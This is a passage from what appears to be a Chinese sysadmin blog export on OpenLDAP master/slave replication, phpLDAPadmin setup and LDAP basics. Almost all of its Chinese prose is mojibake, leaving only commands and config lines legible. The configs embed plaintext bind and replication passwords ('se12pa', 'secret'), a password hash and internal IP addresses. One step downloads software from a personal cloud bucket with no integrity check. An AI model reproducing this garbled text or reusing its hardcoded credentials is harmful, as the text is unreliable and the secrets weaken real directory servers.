eq,presindex uid,memberUid eq,pres,subindex nisMapName,nisMapEntry eq,pres,subindex entryCSN,entryUUID eq# syncprové…ç½®#é…ç½®æœ«å°¾æ·»åŠ å¦‚ä¸‹3è¡Œ# ########################################################################åç«¯å·¥ä½œåœ¨overlayæ¨¡å¼overlay syncprov#å½“æ»¡è¶³éœ€æ”¹100ä¸ªentryæˆ–è€…10åˆ†é’Ÿçš„æ¡ä»¶æ—¶ä¸»åŠ¨ä»¥æ¨çš„æ–¹å¼æ‰§è¡Œsyncprov-checkpoint 100 10#ä¼šè¯æ—¥å¿—æ¡ç›®çš„æœ€å¤§æ•°é‡syncprov-sessionlog 100 ä¿®æ”¹ç³»ç»Ÿæ—¥å¿—é…ç½®æ–‡ä»¶123456# vim /etc/rsyslog.conf local4.* /var/log/ldap.log# local7.*ä¸‹æ·»åŠ ä¸€è¡Œåœ¨å¯åŠ¨æœåŠ¡ã€‚# service rsyslog restart æµ‹è¯• slapd.conf è®¾ç½® slaptestæ£€æµ‹ã€ç”Ÿæˆæ•°æ®åº“12[root@openldap-master openldap]# slaptest -uconfig file testing succeeded OpenLDAP çš„å¯åŠ¨ä¸åœæ­¢123456# service slapd stop# rm -rf /etc/openldap/slapd.d/*#chown ldap.ldap /var/lib/ldap/*# slaptest -f /etc/openldap/slapd.conf -F /etc/openldap/slapd.d# chown -R ldap:ldap /etc/openldap/slapd.d# service slapd restart é…ç½®ç®¡ç†è„šæœ¬ï¼šå¯ä»¥å†™æˆè„šæœ¬ 12345678910#----------------------------------------------------vim ldap.sh#----------------------------------------------------#!/bin/bash/etc/init.d/slapd stoprm -rf /etc/openldap/slapd.d/*slaptest -f /etc/openldap/slapd.conf -F /etc/openldap/slapd.dchown -R ldap.ldap /etc/openldap/slapd.d/etc/init.d/slapd start#---------------------------------------------------- è®¾ç½®å¼€æœºå¯åŠ¨ï¼š 12[root@Ldap-Server ldap]# chkconfig slapd on[root@Ldap-Server ldap]# chkconfig rsyslog on é»˜è®¤ä½¿ç”¨ç«¯å£ä¸º389 é€šè¿‡sslåè®®åŠ å¯†åslapdè¿›ç¨‹ä½¿ç”¨663ç«¯å£å· 123[root@Ldap-Server ldap]# netstat -lntup|grep 389tcp 0 0 0.0.0.0:389 0.0.0.0:* LISTEN 25358/slapdtcp 0 0 :::389 :::* LISTEN 25358/slapd è¿™é‡Œåˆ›å»ºå¥½ä»¥åå†å‚è€ƒç¬¬ä¸€ç¯‡åˆ›å»ºå¯¼å…¥ç‚¹æ•°æ®ï¼Œä½œä¸ºè®¾ç½®åŒæ­¥æŸ¥çœ‹æ•ˆæœã€‚ ä½¿ç”¨ phpLDAPadmin1234567891011121314#å®‰è£…PHPyum -y install php-gd php-xml php-mbstring php-ldap php-pear php-xmlrpc php éœ€è¦PHPæ¨¡å—æ”¯æŒ#å®‰è£…Apacheyum install httpd -yvi /etc/httpd/conf/httpd.confæ·»åŠ ï¼š....ServerName 192.168.17.145:80Listen 80.....service httpd start å…ˆé€šè¿‡scpä¸Šä¼ phpldapadmin-1.2.3.zipåˆ°apacheç½‘é¡µç›®å½• ä¸‹è½½ï¼šphpldapadmin æˆ–è€…è¿™é‡Œç”¨æˆ‘ä¸‹è½½å¥½çš„é“¾æ¥wget. 12345678910111213141516171819202122232425262728293031323334#1. ä¸‹è½½å®‰è£… cd /var/www/html/ wget http://oak0aohum.bkt.clouddn.com/phpldapadmin-1.2.3.tgz tar -zxvf phpldapadmin-1.2.3.tgz mv phpldapadmin-1.2.3 phpldapadmin cd phpldapadmin/config/ cp config.php.example config.php vim config.php#2. ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼švim /var/www/html/phpldapadmin/config/config.php/*$servers-&gt;newServer('ldap_pla');$servers-&gt;setValue('server','name','LDAP Server');$servers-&gt;setValue('server','host','192.168.17.145');$servers-&gt;setValue('server','port',389);$servers-&gt;setValue('server','base',array('dc=jollychic,dc=com'));$servers-&gt;setValue('login','auth_type','cookie');$servers-&gt;setValue('login','bind_id','cn=Manager,dc=jollychic,dc=com');$servers-&gt;setValue('login','bind_pass','&#123;SSHA&#125;SlPVguw1zrxCkTnGXLM2jZpDZio9Btyt');$servers-&gt;setValue('server','tls',false);#apache-httpä¿®æ”¹ vim /etc/httpd/conf/httpd.conf &lt;Directory \"/var/www/html/phpldapadmin\"&gt; DirectoryIndex index.html index.html.var index.php#é‡å¯æœåŠ¡ã€‚ service httpd restart#é˜²ç«å¢™ç«¯å£å¼€å¯ -A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT#é‡å¯iptables service iptables restart ç™»å½•PHPldapadmin slave1 | Centos6.6å®‰è£…OpenLDAPOpenLDAP slave1æœåŠ¡å™¨| openldap-slave1 | 192.168.3.15 å‰é¢å®‰è£…å…¨éƒ¨ä¸€æ ·ï¼Œåªéœ€è¦åœ¨slaveé…ç½®ä¸Šé¢åšä¸‹ä¿®æ”¹ï¼š 123456789101112131415161718192021# syncprové…ç½®# #######################################################################overlay syncprovsyncprov-checkpoint 100 10syncprov-sessionlog 100syncrepl rid=123 provider=ldap://192.168.17.145:389 type=refreshAndPersist searchbase=\"dc=jollychic,dc=com\" interval=00:00:00:10 schemachecking=off searchbase=\"dc=jollychic,dc=com\" bindmethod=simple scope=sub binddn=\"cn=Manager,dc=jollychic,dc=com\" retry=\"60 +\" attrs=\"*,+\" credentials=se12pa mirrormode on slave2 | Centos6.6å®‰è£…OpenLDAPOpenLDAP slave2æœåŠ¡å™¨| openldap-slave2 | 192.168.3.82 åªéœ€è¦ä¿®æ”¹rid=124 å¯ä»¥å¾€åæ·»åŠ IDæ•°å­—åŠ 1 123456789101112131415syncrepl rid=124 provider=ldap://192.168.17.145:389 type=refreshAndPersist searchbase=\"dc=jollychic,dc=com\" interval=00:00:00:00 schemachecking=off searchbase=\"dc=jollychic,dc=com\" bindmethod=simple scope=sub binddn=\"cn=Manager,dc=jollychic,dc=com\" retry=\"60 +\" attrs=\"*,+\" credentials=se12pa mirrormode on è§£é‡Šè¯´æ˜ï¼š 1234567891011121314151617# syncreplç‰¹æœ‰çš„ç´¢å¼• index entryCSN eq index entryUUID eq # syncreplå‚æ•° syncrepl rid=203 provider=ldap://IPåœ°å€:ç«¯å£ #æä¾›è€…çš„IPå’Œç«¯å£å· provideré¡¹å¡«å†™ä¸»æœåŠ¡å™¨çš„ldapåœ°å€bindmethod=simple #è®¤è¯æ–¹å¼ï¼Œé»˜è®¤é€‰æ‹©ç®€å•è®¤è¯ interval=00:00:00:00 #åŒæ­¥æ—¶é—´é—´éš” å¤©ï¼šå°æ—¶ï¼šåˆ†é’Ÿï¼šç§’ intervalè¡¨ç¤ºä»æœåŠ¡å™¨å¤šä¹…è·Ÿä¸»æœåŠ¡å™¨è¿›è¡Œä¸€æ¬¡æ•°æ®åŒæ­¥binddn=\"cn=Manager,dc=jollychic,dc=com\" #ç™»é™†çš„ldapè´¦å· credentials=ç™»é™†å¯†ç  searchbase=\"dc=jollychic,dc=com\" #åŒæ­¥çš„æ ¹è·¯å¾„ filter=\"(objectClass=*)\" scope=sub attrs=\"*,+\" type=refreshAndPersist #åŒæ­¥æ–¹å¼ï¼šæœ‰refreshAndPersistå’Œ retry=\"60 10 600 +\" # retryè¡¨ç¤ºå¤±è´¥é‡è¯•ç­–ç•¥ PS:åœ¨phpldapadminæ·»åŠ ä»LDAPæœåŠ¡å™¨ã€ä¾¿äºç®¡ç†12345678910111213/* A convenient name that will appear in the tree viewer and throughout phpLDAPadmin to identify this LDAP server to users. */$servers-&gt;setValue('server','name','My LDAP Server');$servers-&gt;newServer('ldap_pla');$servers-&gt;setValue('server','name','192.168.3.15:389');$servers-&gt;setValue('server','host','192.168.3.15');$servers-&gt;setValue('server','port','389');$servers-&gt;newServer('ldap_pla');$servers-&gt;setValue('server','name','192.168.3.82:389');$servers-&gt;setValue('server','host','192.168.3.82');$servers-&gt;setValue('server','port','389'); ç™»å½•æµ‹è¯•æ•°æ®æ˜¯å¦åŒæ­¥ï¼š slave1 æ•°æ®åŒæ­¥æˆåŠŸå›¾ï¼š slave2 æ•°æ®åŒæ­¥æˆåŠŸå›¾ï¼š é‡åˆ°æ•…éšœé—®é¢˜ï¼š 123456789[root@ldap-master ~]# ldapsearch -x -LLLNo such object (32)æ‰“å¼€å¹¶ä¿®æ”¹ä¸ºå¦‚ä¸‹ä¸¤è¡Œå³å¯vim /etc/openldap/ldap.conf#-----------------------------------------------------------------BASE dc=jollychic,dc=comURI ldap://192.168.17.145#----------------------------------------------------------------- æµ‹è¯•ç»“æœï¼Œä¸»ä»é…ç½®æˆåŠŸã€‚ è¡¥å……ï¼šç”±äºåœ¨syncreplä¸­slaveæ˜¯refreshOnlyï¼Œç›¸å½“äºä»èŠ‚ç‚¹æ˜¯åªè¯»çš„ï¼Œè¿™æ—¶ä¸å…è®¸åœ¨ä»èŠ‚ç‚¹å¯¼å…¥æˆ–è€…åˆ é™¤ç”¨æˆ·ï¼Œå¦åˆ™ä¼šå‡ºç°é”™è¯¯ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚ 12345[root@LDAP openldap]# ldapadd -x -D \"cn=Manager,dc=jollychic,dc=com\" -W -f /tmp/jolly.ldifEnter LDAP Password:adding new entry \"dc=jollychic,dc=com\"ldap_add: Server is unwilling to perform (53) additional info: shadow context; no update referral å‚è€ƒï¼šhttps://itsecureadmin.com/2013/01/ldapmodify-fails-with-server-is-unwilling-to-perform-53/","link":"/2017/06/08/OpenLDAP/OpenLDAPä¸€ä¸»å¤šä»å¤åˆ¶èŠ‚ç‚¹æœåŠ¡çš„é…ç½®-phpldapadminç®¡ç†è®¤è¯/"},{"title":"OpenLDAPå…¥é—¨äº†è§£å­¦ä¹ ç¬”è®°(ä¸€)","text":"OpenLDAPå…¥é—¨äº†è§£LDAPæ¦‚è¿°æˆ‘çš„ä¸ªäººç†è§£ï¼šLDAPæ˜¯è½»é‡ç›®å½•è®¿é—®åè®®(Lightweight Directory Access Protocol)çš„ç¼©å†™ï¼ŒLDAPæ˜¯ä¸€ä¸ªç»Ÿä¸€çš„è´¦å·ç®¡ç†è®¤è¯å¹³å°ï¼Œä½¿ç”¨è½»é‡çº§ç›®å½•è®¿é—®åè®®ï¼ˆLDAPï¼‰æ„å»ºé›†ä¸­çš„èº«ä»½éªŒè¯ç³»ç»Ÿå¯ä»¥å‡å°‘ç®¡ç†æˆæœ¬ï¼Œå¢å¼ºå®‰å…¨æ€§ï¼Œé¿å…æ•°æ®å¤åˆ¶çš„é—®é¢˜ï¼Œå¹¶æé«˜æ•°æ®çš„ä¸€è‡´æ€§ã€‚éšç€ Linuxçš„ä¸æ–­æˆç†Ÿï¼Œå·²ç»å‡ºç°äº†å¾ˆå¤šå·¥å…·ç”¨æ¥ç®€åŒ–ç”¨æˆ·å¸å·ä¿¡æ¯åˆ° LDAPç›®å½•çš„è¿ç§»ã€‚è¿˜å¼€å‘äº†ä¸€äº›å·¥å…·ç”¨æ¥åœ¨å®¢æˆ·æœºå’Œç›®å½•æœåŠ¡å™¨ä¹‹é—´å¯ç”¨åŠ å¯†é€šä¿¡é…ç½®ï¼Œå¹¶é€šè¿‡å¤åˆ¶æä¾›å®¹é”™æ€§ã€‚æœ¬æ–‡å°†å‘æ‚¨å±•ç¤ºå¦‚ä½•é…ç½®æœåŠ¡å™¨å’Œå®¢æˆ·æœºåœ¨Centosä¸Šä½¿ç”¨OpenLDAPã€‚ å®˜æ–¹è§£é‡Šï¼š ä»€ä¹ˆæ˜¯LDAP? LDAPçš„è‹±æ–‡å…¨ç§°æ˜¯Lightweight Directory Access Protocolï¼Œä¸€èˆ¬éƒ½ç®€ç§°ä¸ºLDAPã€‚å®ƒæ˜¯åŸºäºX.500æ ‡å‡†çš„ï¼Œä½†æ˜¯ç®€å•å¤šäº†å¹¶ä¸”å¯ä»¥æ ¹æ®éœ€è¦å®šåˆ¶ã€‚ä¸X.500ä¸åŒï¼ŒLDAPæ”¯æŒTCP/IPï¼Œè¿™å¯¹è®¿é—®Internetæ˜¯å¿…é¡»çš„ã€‚LDAPçš„æ ¸å¿ƒè§„èŒƒåœ¨RFCä¸­éƒ½æœ‰å®šä¹‰ï¼Œæ‰€æœ‰ä¸LDAPç›¸å…³çš„RFCéƒ½å¯ä»¥åœ¨LDAPman RFCç½‘é¡µä¸­æ‰¾åˆ°ã€‚ æ€ä¹ˆä½¿ç”¨LDAPè¿™ä¸ªæœ¯è¯­å‘¢ï¼Ÿ åœ¨æ—¥å¸¸äº¤è°ˆä¸­ï¼Œä½ å¯èƒ½ä¼šå¬åˆ°æœ‰äº›äººè¿™ä¹ˆè¯´ï¼šâ€œæˆ‘ä»¬è¦æŠŠé‚£äº›ä¸œè¥¿å­˜åœ¨LDAPä¸­å—ï¼Ÿâ€ï¼Œæˆ–è€…â€œä»LDAPæ•°æ®åº“ä¸­å–å‡ºé‚£äº›æ•°æ®ï¼â€ï¼Œåˆæˆ–è€…â€œæˆ‘ä»¬æ€ä¹ˆæŠŠLDAPå’Œå…³ç³»å‹æ•°æ®åº“é›†æˆåœ¨ä¸€èµ·ï¼Ÿâ€ã€‚ä¸¥æ ¼åœ°è¯´ï¼ŒLDAPæ ¹æœ¬ä¸æ˜¯æ•°æ®åº“è€Œæ˜¯ç”¨æ¥è®¿é—®å­˜å‚¨åœ¨ä¿¡æ¯ç›®å½•ï¼ˆä¹Ÿå°±æ˜¯LDAPç›®å½•ï¼‰ä¸­çš„ä¿¡æ¯çš„åè®®ã€‚æ›´ä¸ºç¡®åˆ‡å’Œæ­£å¼çš„è¯´æ³•åº”è¯¥æ˜¯è±¡è¿™æ ·çš„ï¼šâ€œé€šè¿‡ä½¿ç”¨LDAPï¼Œå¯ä»¥åœ¨ä¿¡æ¯ç›®å½•çš„æ­£ç¡®ä½ç½®è¯»å–ï¼ˆæˆ–å­˜å‚¨ï¼‰æ•°æ®â€ã€‚ä½†æ˜¯ï¼Œä¹Ÿæ²¡æœ‰å¿…è¦å¹æ¯›æ±‚ç–µï¼Œå°½ç®¡è¡¨è¾¾å¾—ä¸å¤Ÿå‡†ç¡®ï¼Œæˆ‘ä»¬ä¹Ÿéƒ½çŸ¥é“å¯¹æ–¹åœ¨è¯´ä»€ä¹ˆã€‚ è§„åˆ’ LDAP ç›®å½•ç»“æ„è¦çœŸæ­£äº†è§£ LDAP,å¯ä»¥ä»è§„åˆ’ä¸€ä¸ª LDAP ç›®å½•æ ‘å¼€å§‹ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ä¾‹å­ã€‚å‡è®¾æœ‰ä¸€ä¸ªåä¸º Example çš„å…¬å¸(DNS åä¸ºexample.com). åœ¨è§„åˆ’è¿‡ç¨‹ä¸­,é¦–å…ˆè¦ä¸ºç›®å½•æ ‘å»ºç«‹ä¸€ä¸ªâ€œæ ¹(root)â€ã€‚æ ¹æ˜¯ç›®å½•æ ‘çš„æœ€é¡¶å±‚,ä¹‹åå»ºç«‹çš„æ‰€ æœ‰å¯¹è±¡éƒ½æ˜¯åŸºäºè¿™ä¸ªæ ¹çš„,ä¹Ÿç§°ä¸ºåŸºå‡† DNã€‚å…·æœ‰ä¸‰ç§æ ¼å¼è¡¨ç¤ºã€‚ 1ä½¿ç”¨ x.500æ ‡å‡†æ ¼å¼:o=example,c=CNã€‚ ç›´æ¥ä½¿ç”¨å…¬å¸çš„ DNS åŸŸå:o=example.comã€‚ ä½¿ç”¨å…¬å¸çš„ DNS åŸŸåçš„ä¸åŒéƒ¨åˆ†:dc=example,dc=comã€‚ ä¸€èˆ¬è€Œè¨€,æ¨èä½¿ç”¨ç¬¬ä¸‰ç§æ ¼å¼,å› ä¸ºå…¶æ›´åˆ©äºä»¥åç›®å½•æ ‘çš„æ‰©å±•,è‹¥å°†æ¥ Example å…¬å¸åˆå¹¶äº† Test å…¬å¸,åªéœ€è¦å°† Test.com ä½œä¸ºæ ¹å³å¯,ä¸éœ€è¦ä¿®æ”¹åŸæœ‰çš„ç»“æ„ã€‚å…¬å¸ä¸­çš„éƒ¨é—¨ä½œä¸º OU,å¦‚â€œou=salesâ€ã€‚ OU æ˜¯ç›®å½•æ ‘çš„åˆ†æèŠ‚ç‚¹,OU ä¹‹ä¸‹å¯ä»¥åŒ…å«å…¶ä»–åˆ†æèŠ‚ç‚¹æˆ–å¶å­èŠ‚ç‚¹ã€‚ ç”¨æˆ·æ˜¯ç›®å½•æ•°çš„æœ€åº•å±‚(å³å¶å­èŠ‚ç‚¹),å¯ä»¥æ ¹æ®ç”¨æˆ·æ‰€åœ¨çš„éƒ¨é—¨ä½äºä¸åŒçš„ OU ä¸­,ä½¿ç”¨ uidæˆ– cn æè¿°éƒ½å¯,å¦‚â€œuid=tomâ€æˆ–â€œcn=Kelly Kingâ€ã€‚å› æ­¤,å¯ä»¥å°† Example å…¬å¸çš„ç»„ç»‡ç»“æ„è½¬åŒ–ä¸ºå¦‚å›¾æ‰€ç¤ºçš„ LDAP ç›®å½•æ ‘ã€‚ å›¾- LDAP ç›®å½•æ ‘ LDAPçš„åŠŸèƒ½åœ¨LDAPçš„åŠŸèƒ½æ¨¡å‹ä¸­å®šä¹‰äº†ä¸€ç³»åˆ—åˆ©ç”¨LDAPåè®®çš„æ“ä½œï¼Œä¸»è¦åŒ…å«ä»¥ä¸‹4éƒ¨åˆ†ï¼š æŸ¥è¯¢æ“ä½œ ï¼šå…è®¸æŸ¥è¯¢ç›®å½•å’Œå–å¾—æ•°æ®ï¼Œå…¶æŸ¥è¯¢æ€§èƒ½æ¯”å…³ç³»æ•°æ®åº“å¥½ã€‚ æ›´æ–°æ“ä½œ ï¼šç›®å½•çš„æ›´æ–°æ“ä½œæ²¡å…³ç³»æ•°æ®åº“æ–¹ä¾¿ï¼Œæ›´æ–°æ€§èƒ½è¾ƒå·®ï¼Œä½†ä¹ŸåŒæ ·å…è®¸è¿›è¡Œæ·»åŠ ã€åˆ é™¤ã€ä¿®æ”¹ç­‰æ“ä½œã€‚ å¤åˆ¶æ“ä½œ ï¼šå‰é¢ä¹Ÿæåˆ°è¿‡ï¼ŒLDAPæ˜¯ä¸€ç§å…¸å‹çš„åˆ†å¸ƒå¼ç»“æ„ï¼Œæä¾›å¤åˆ¶æ“ä½œï¼Œå¯å°†ä¸»æœåŠ¡å™¨çš„æ•°æ®çš„æ›´æ–°å¤åˆ¶åˆ°è®¾ç½®çš„ä»æœåŠ¡å™¨ä¸­ã€‚ è®¤è¯å’Œç®¡ç†æ“ä½œ ï¼šå…è®¸å®¢æˆ·ç«¯åœ¨ç›®å½•ä¸­è¯†åˆ«è‡ªå·±ï¼Œå¹¶ä¸”èƒ½å¤Ÿæ§åˆ¶ä¸€ä¸ªä¼šè¯çš„æ€§è´¨ã€‚ LDAPç›®å½•çš„ä¼˜åŠ¿ LDAPåè®®æ˜¯è·¨å¹³å°çš„å’Œæ ‡å‡†çš„åè®®ï¼Œå› æ­¤åº”ç”¨ç¨‹åºå°±ä¸ç”¨ä¸ºLDAPç›®å½•æ”¾åœ¨ä»€ä¹ˆæ ·çš„æœåŠ¡å™¨ä¸Šæ“å¿ƒäº†ã€‚ LDAPæœåŠ¡å™¨å¯ä»¥ç”¨â€œæ¨â€æˆ–â€œæ‹‰â€çš„æ–¹æ³•å¤åˆ¶éƒ¨åˆ†æˆ–å…¨éƒ¨æ•°æ®ï¼Œä¾‹å¦‚ï¼šå¯ä»¥æŠŠæ•°æ®â€œæ¨â€åˆ°è¿œç¨‹çš„åŠå…¬å®¤ï¼Œä»¥å¢åŠ æ•°æ®çš„å®‰å…¨æ€§ã€‚å¤åˆ¶æŠ€æœ¯æ˜¯å†…ç½®åœ¨LDAPæœåŠ¡å™¨ä¸­çš„è€Œä¸”å¾ˆå®¹æ˜“é…ç½®ã€‚ LDAPåè®®çš„ç‰¹ç‚¹ LDAPæ˜¯ä¸€ç§ç›®å½•æœåŠ¡ï¼Œä¿å­˜åœ¨ç‰¹æ®Šçš„æ•°æ®åº“ä¸­ï¼Œæ•°æ®çš„è¯»å–é€Ÿåº¦è¿œé«˜äºå†™å…¥é€Ÿåº¦ã€‚ LDAPå¯¹æŸ¥è¯¢åšäº†ä¼˜åŒ–ï¼Œè¯»å–é€Ÿåº¦ä¼˜äºæ™®é€šå…³ç³»æ•°æ®åº“ã€‚ LDAPä¸æ”¯æŒäº‹åŠ¡ã€ä¸èƒ½è¿›è¡Œå›æ»šï¼Œéœ€è¦è¿›è¡Œè¿™äº›æ“ä½œçš„åº”ç”¨åªæœ‰é€‰æ‹©å…³ç³»æ•°æ®åº“ã€‚ LDAPé‡‡ç”¨æœåŠ¡å™¨/å®¢æˆ·ç«¯æ¨¡å¼ï¼Œæ”¯æŒåˆ†å¸ƒå¼ç»“æ„ã€‚ LDAPä¸­çš„æ¡ç›®ä»¥æ ‘å½¢ç»“æ„ç»„ç»‡å’Œå­˜å‚¨ã€‚ LDAPåŸºäºInternetåè®®ï¼Œç›´æ¥è¿è¡Œåœ¨ç®€å•å’Œé€šç”¨çš„TCP/IPæˆ–å…¶ä»–å¯é çš„ä¼ è¾“åè®®å±‚ä¸Šï¼Œä½¿è¿æ¥çš„å»ºç«‹å’ŒåŒ…çš„å¤„ç†ç®€å•ã€å¿«æ·ï¼Œå¯¹äºäº’è”ç½‘å’Œä¼ä¸šç½‘åº”ç”¨éƒ½å¾ˆæ–¹ä¾¿ã€‚ LDAPåè®®ç®€å•ï¼Œé€šè¿‡ä½¿ç”¨æŸ¥æ‰¾æ“ä½œå®ç°åˆ—è¡¨æ“ä½œå’Œè¯»æ“ä½œã€‚ LDAPé€šè¿‡å¼•ç”¨æœºåˆ¶å®ç°åˆ†å¸ƒå¼è®¿é—®ï¼Œé€šè¿‡å®¢æˆ·ç«¯APIå®ç°åˆ†å¸ƒå¼æ“ä½œï¼ˆå¯¹äºåº”ç”¨é€æ˜ï¼‰ï¼Œå¹³è¡¡äº†è´Ÿè½½ã€‚ LDAPå®ç°å…·æœ‰ä½è´¹ç”¨ã€æ˜“é…ç½®å’Œæ˜“ç®¡ç†çš„ç‰¹ç‚¹ï¼Œå¹¶æä¾›äº†æ»¡è¶³åº”ç”¨ç¨‹åºå¯¹ç›®å½•æœåŠ¡æ‰€éœ€æ±‚çš„ç‰¹æ€§ã€‚","link":"/2017/01/26/OpenLDAP/OpenLDAPå…¥é—¨äº†è§£å­¦ä¹ ç¬”è®°(ä¸€)/"},{"title":"OpenLDAPä¼ä¸šåº”ç”¨æ–¹æ¡ˆ-PPTè®¤è¯†LDAP+ç†Ÿæ‚‰æ“ä½œLDAPå‘½ä»¤","text":"è®¤è¯†LDAPç†Ÿæ‚‰LDAPé…ç½®LDAPç›®å½•ä¸­å¯ä»¥å­˜å‚¨å„ç§ç±»å‹çš„æ•°æ®ï¼šç”µå­é‚®ä»¶åœ°å€ã€é‚®ä»¶è·¯ç”±ä¿¡æ¯ã€äººåŠ›èµ„æºæ•°æ®ã€å…¬ç”¨å¯†åŒ™ã€è”ç³»äººåˆ—è¡¨ï¼Œç­‰ç­‰ä½†æ˜¯ä¸æ˜¯å…³ç³»å‹æ•°æ®åº“ã€‚ä¸è±¡è¢«è®¾è®¡æˆæ¯åˆ†é’Ÿéœ€è¦å¤„ç†æˆç™¾ä¸Šåƒæ¡æ•°æ®å˜åŒ–çš„æ•°æ®åº“å¯ä»¥æŠŠæ•°æ®â€œæ¨â€åˆ°è¿œç¨‹çš„åŠå…¬å®¤ï¼Œä»¥å¢åŠ æ•°æ®çš„å®‰å…¨æ€§å¤åˆ¶åŠŸèƒ½ï¼Œæ•°æ®åº“äº§å•†å°±ä¼šè¦ä½ æ”¯ä»˜é¢å¤–çš„è´¹ç”¨ï¼Œè€Œä¸”ä¹Ÿå¾ˆéš¾ç®¡ç† LDAPç»„ç»‡-ç›®å½•æ ‘çš„ç»“æ„1234567891011121314151617181920212223LDAPç›®å½•ä¸­çš„æ‰€æœ‰è®°å½•é¡¹éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„â€œDistinguished Nameâ€ç°åœ¨ä¸ºå…¬å¸çš„å‘˜å·¥è®¾ç½®ä¸€ä¸ªDNã€‚å¯ä»¥ç”¨åŸºäºcnæˆ–uidï¼ˆUser IDï¼‰ï¼Œä½œä¸ºå…¸å‹çš„ç”¨æˆ·å¸å·ç”¨uidè¡¨ç¤ºâ€œUser IDâ€ï¼Œä¸è¦æŠŠå®ƒå’ŒUNIXçš„uidå·æ··æ·†äº† ï¼Œå¤§å¤šæ•°å…¬å¸éƒ½ä¼šç»™æ¯ä¸€ä¸ªå‘˜å·¥å”¯ä¸€çš„ç™»å½•åï¼Œå› æ­¤ç”¨è¿™ä¸ªåŠæ³•å¯ä»¥å¾ˆå¥½åœ°ä¿å­˜å‘˜å·¥çš„ä¿¡æ¯LDIFæ–‡ä»¶æ ¼å¼ä¾‹å­ï¼šä¸€ä¸ªæ™®é€šç”¨æˆ·éƒ½è¦å­˜å“ªäº›ä¿¡æ¯?ä½ å¯ä»¥ç”¨LDAPå­˜å‚¨å„ç§ç±»å‹çš„æ•°æ®å¯¹è±¡ï¼Œåªè¦è¿™äº›å¯¹è±¡å¯ä»¥ç”¨å±æ€§æ¥è¡¨ç¤ºï¼Œä¸‹é¢è¿™äº›æ˜¯å¯ä»¥åœ¨LDAPä¸­å­˜å‚¨çš„ä¸€äº›ä¿¡æ¯ï¼š å‘˜å·¥ä¿¡æ¯ï¼šå‘˜å·¥çš„å§“åã€ç™»å½•åã€å£ä»¤ã€å‘˜å·¥å·ã€ä»–çš„ç»ç†çš„ç™»å½•åï¼Œé‚®ä»¶æœåŠ¡å™¨ï¼Œç­‰ç­‰ã€‚ lDAPé»˜è®¤ç«¯å£ï¼šç«¯å£ä¸º389LDAPåŒæ­¥é…ç½®:# Where to store the replica logs for database #1#replogfile /var/lib/ldap/master-slapd.replogreplogfile /var/lib/ldap/master-slapd.replogreplica host=192.168.7.108:389 binddn=\"cn=admin,dc=ldap,dc=monkey,dc=com,dc=de\" bindmethod=simple credentials='password' OpenLDAP åŒ…åœ¨æœåŠ¡å™¨ä¸Šå®‰è£…äº†å¾ˆå¤šç¨‹åºï¼š123456789101112131415161718 å®ˆæŠ¤è¿›ç¨‹ï¼š- slapdï¼šä¸» LDAP æœåŠ¡å™¨- slurpdï¼šè´Ÿè´£ä¸å¤åˆ¶ LDAP æœåŠ¡å™¨ä¿æŒåŒæ­¥çš„æœåŠ¡å™¨- å¯¹ç½‘ç»œä¸Šçš„ç›®å½•è¿›è¡Œæ“ä½œçš„å®¢æˆ·æœºç¨‹åºã€‚ä¸‹é¢è¿™ä¸¤ä¸ªç¨‹åºæ˜¯ä¸€å¯¹å„¿ï¼š- ldapaddï¼šæ‰“å¼€ä¸€ä¸ªåˆ° LDAP æœåŠ¡å™¨çš„è¿æ¥ï¼Œç»‘å®šã€ä¿®æ”¹æˆ–å¢åŠ æ¡ç›®- ldapsearchï¼šæ‰“å¼€ä¸€ä¸ªåˆ° LDAP æœåŠ¡å™¨çš„è¿æ¥ï¼Œç»‘å®šå¹¶ä½¿ç”¨æŒ‡å®šçš„å‚æ•°è¿›è¡Œæœç´¢- å¯¹æœ¬åœ°ç³»ç»Ÿä¸Šçš„æ•°æ®åº“è¿›è¡Œæ“ä½œçš„å‡ ä¸ªç¨‹åºï¼š- slapaddï¼šå°†ä»¥ LDAP ç›®å½•äº¤æ¢æ ¼å¼ï¼ˆLDIFï¼‰æŒ‡å®šçš„æ¡ç›®æ·»åŠ åˆ° LDAP æ•°æ®åº“ä¸­- slapcatï¼šæ‰“å¼€ LDAP æ•°æ®åº“ï¼Œå¹¶å°†å¯¹åº”çš„æ¡ç›®è¾“å‡ºä¸º LDIF æ ¼å¼ Openldapå‘½ä»¤æ“ä½œæ€»ç»“ï¼š12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152è§£è¯»é…ç½®æ–‡ä»¶ï¼švim /etc/openldap/slapd.confä¾‹å­ åˆ›å»ºç”¨æˆ·ldapadd -x -D \"cn=Manager,dc=jollychic,dc=com\" -w secret -f /root/test.ldif ldapadd -x -D \"cn=Manager,dc=jollychic,dc=com\" -w secret (è¿™æ ·å†™å°±æ˜¯åœ¨å‘½ä»¤è¡Œæ·»åŠ æ¡ç›®)-x è¿›è¡Œç®€å•è®¤è¯-D ç”¨æ¥ç»‘å®šæœåŠ¡å™¨çš„DN-w ç»‘å®šDNçš„å¯†ç -b æŒ‡å®šè¦æŸ¥è¯¢çš„æ ¹èŠ‚ç‚¹-H åˆ¶å®šè¦æŸ¥è¯¢çš„æœåŠ¡å™¨-S æç¤ºçš„è¾“å…¥å¯†ç -s pass æŠŠå¯†ç è®¾ç½®ä¸ºpass-a pass è®¾ç½®old passwdä¸ºpass-A æç¤ºçš„è®¾ç½®old passwd-I ä½¿ç”¨saslä¼šè¯æ–¹å¼è¿™æ ·å¯ä»¥è®¿é—®æ•´ä¸ªçš„æ´»åŠ¨ç›®å½•ç»“æ„.ldapsearch -x -W -D \"cn=Manager,dc=jollychic,dc=com\" -b \"dc=jollychic,dc=com\" se12paldapsearch -x -W -D \"uid=764,ou=users,dc=jollychic,dc=com\" -b \"uid=764,ou=users,dc=jollychic,dc=com\"ä½¿ç”¨ç®€å•è®¤è¯ï¼Œç”¨ \"ou=users,dc=jollychic,dc=com\" è¿›è¡Œç»‘å®šï¼Œè¦æŸ¥è¯¢çš„æ ¹æ˜¯ \"dc=jollychic,dc=com\"ã€‚è¿™æ 